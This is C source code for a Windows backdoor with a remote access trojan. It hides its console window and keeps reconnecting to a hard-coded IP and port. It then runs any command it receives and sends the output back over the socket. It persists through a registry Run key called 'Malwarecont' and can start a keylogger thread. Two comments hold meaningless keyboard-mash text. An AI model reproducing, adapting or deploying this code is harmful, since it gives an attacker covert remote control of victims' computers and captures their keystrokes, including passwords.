#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <winsock2.h>
#include <windows.h>
#include <winuser.h>
#include <wininet.h>
#include <windowsx.h>
#include <string.h>
#include <conio.h>
#include <math.h>
#include <sys/stat.h>
#include <sys/types.h>
#include "Keylogger.h"

#define bzero(p, size) (void) memset((p), 0, (size)) //bzero Function Declaration and Defination

int sock;     //Global Socket Declaration
//======================================================================================================================================================
//bootRun Function Declaration And Defination
int bootRun()
{
  char err[128] = "Failed\n";   //Variable for failed Msg.
  char suc[128] = "Created the Resource at : HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\n";  //Variable for Sucess Msg.
  TCHAR szPath[MAX_PATH];
  DWORD pathlen = 0;

  //Trying to get The Path for Registry Editor
  pathlen = GetModuleFileName(NULL,szPath,MAX_PATH);

  if (pathlen == 0)
   {
     send(sock,err,sizeof(err),0);
     return -1;
  }
  //================================================================================================================================================================
//Creating Registry Inside the Registry Folder Of Target Computer
  HKEY NewValue;
  if (RegOpenKey(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), &NewValue) != ERROR_SUCCESS)
   {
     send(sock,err,sizeof(err),0);      //Sending Error Report
     return -1;
  }

  DWORD pathlenb = pathlen *sizeof(*szPath);
  if (RegSetValueEx(NewValue, TEXT("Malwarecont"), 0, REG_SZ, (LPBYTE)szPath, pathlenb) != ERROR_SUCCESS)  //creating the Registry file with name of Malwarecont
   {
    RegCloseKey(NewValue);
    send(sock,err,sizeof(err),0);   //Sending Error Report
    return -1;
  }
//uaihadei h8ffhfiaehfidfiauua9fuerhiudhgiahtp3498ut94ut9eutqhntuiehgiejioytiargjkidlzonj hreiheriuhiearjvnrekfjhkdjdlihg;iearotknkf
  RegCloseKey(NewValue);
  send(sock,suc,sizeof(suc),0);     //Sending success Report
  return 0;
}
//========================================================================================================================================================================
//String Cutter Function Declaration And Defination
char *
str_cut(char str[], int slice_from, int slice_to)
{
        if (str[0] == '\0')
                return NULL;

        char *buffer;
        size_t str_len, buffer_len;

        if (slice_to < 0 && slice_from > slice_to) {
                str_len = strlen(str);
                if (abs(slice_to) > str_len - 1)
                        return NULL;
//hdiDnhi fhEWIUFHIWUHFKAJGIA REHTIERHIFJAIREOGHIUREHFVIUHKGJ;JDLG;IAEORTJIETOIEDJKFDK.EJFKDHJGKFJHKGHTIYHDRIHGIRHGIUHTIHERIGREIGIERHGPOWR JGIRPGJROIGJOIRJTGOIRTJGOI
                if (abs(slice_from) > str_len)
                        slice_from = (-1) * str_len;

                buffer_len = slice_to - slice_from;
                str += (str_len + slice_from);

        } else if (slice_from >= 0 && slice_to > slice_from) {
                str_len = strlen(str);

                if (slice_from > str_len - 1)
                        return NULL;
                buffer_len = slice_to - slice_from;
                str += slice_from;

        } else
                return NULL;

        buffer = calloc(buffer_len, sizeof(char));
        strncpy(buffer, str, buffer_len);
        return buffer;
}
//===============================================================================================================
//program for enabling the shell of Target Computer
void Shell()
 {
	char buffer[1024];                          ////////////////////////////////////////////////////////////////
	char container[1024];                       //             Variable to store Data                         //
	char total_response[18384];                 ////////////////////////////////////////////////////////////////

//Shell Code
	while (1)
  {
		jump:
    //initalizing variables with Value of Zero
		bzero(buffer,1024);
		bzero(container, sizeof(container));
		bzero(total_response, sizeof(total_response));
		recv(sock, buffer, 1024, 0);      //Command reciver Function

		if (strncmp("purse", buffer, 5) == 0)   //Quite command
     {
			closesocket(sock);   //Terminating connecction
			WSACleanup();            //Footprint Cleanup
			exit(0);                   //Exiting Program
		}
      else if (strncmp("cd ",buffer,3) == 0)    //Command for the Terminal Directory
       {
         chdir(str_cut(buffer,3,1000));
      }

          else if (strncmp("proxy",buffer,5) == 0)    //Command to make Thread Runs on every Reboot.
            {
                bootRun();
            }
            else if (strncmp("keystart", buffer, 8) == 0) //Sart Logging the Keys
             {
              HANDLE thread = CreateThread(NULL, 0, logg,NULL,0,NULL);
              goto jump;
            }
		else
    {
			FILE *fp;
			fp = _popen(buffer, "r");        //command to start the connection
			while(fgets(container,1024,fp) != NULL)
       {
				strcat(total_response, container);
			}
			send(sock, total_response, sizeof(total_response), 0);
			fclose(fp);
		}

	}

}
//===============================================================================================================
  int APIENTRY WinMain(HINSTANCE hinStance , HINSTANCE hPrev, LPSTR lpcmdline, int nsmdshow)
  {
    // Hiding the Console Window
    HWND stealth;     //Hiding the window Parameter Initialisation
    AllocConsole();   //Allowing the console
    stealth = FindWindowA("ConsoleWindowClass", NULL);   //Hiding the window Here
    ShowWindow(stealth,0);     //Showing no Performance lag

    //Defining Connection point to our backdoor
    struct sockaddr_in ServAddr;     //Defining the own datatype to store the IP Address
    unsigned short Servport;  //Variable for the Port Address
    char *ServIP;       //Passing the Value to get starts the conversion
    WSADATA Wsadata;
    ServIP = "192.168.43.229";   //System IP for the reciver
    Servport = 50005;           //System Port Address for the reciver

    if(WSAStartup(MAKEWORD(2,0), &Wsadata) != 0)
    {   //if unable to stablise the connection exiting the program
      exit(1);
    }

    //Convering the Ip address for use and Performing the handshake

      sock = socket(AF_INET,SOCK_STREAM,0);
      memset(&ServAddr, 0, sizeof(ServAddr));
      ServAddr.sin_family = AF_INET;
      ServAddr.sin_addr.s_addr = inet_addr(ServIP);
      ServAddr.sin_port = htons(Servport);

      //Handshake Initialisation begins here and initalizing the Connection in each 2 second
          Start:
          while (connect(sock, (struct sockaddr *) &ServAddr, sizeof(ServAddr)) != 0)
           {
            sleep(2);
            goto Start;
          }
//type MessageBox(NULL,TEXT("Your Device Has Been Hacked!!!"),TEXT("Windows Installer"),MB_OK | MB_ICONERROR);
          Shell();
  }
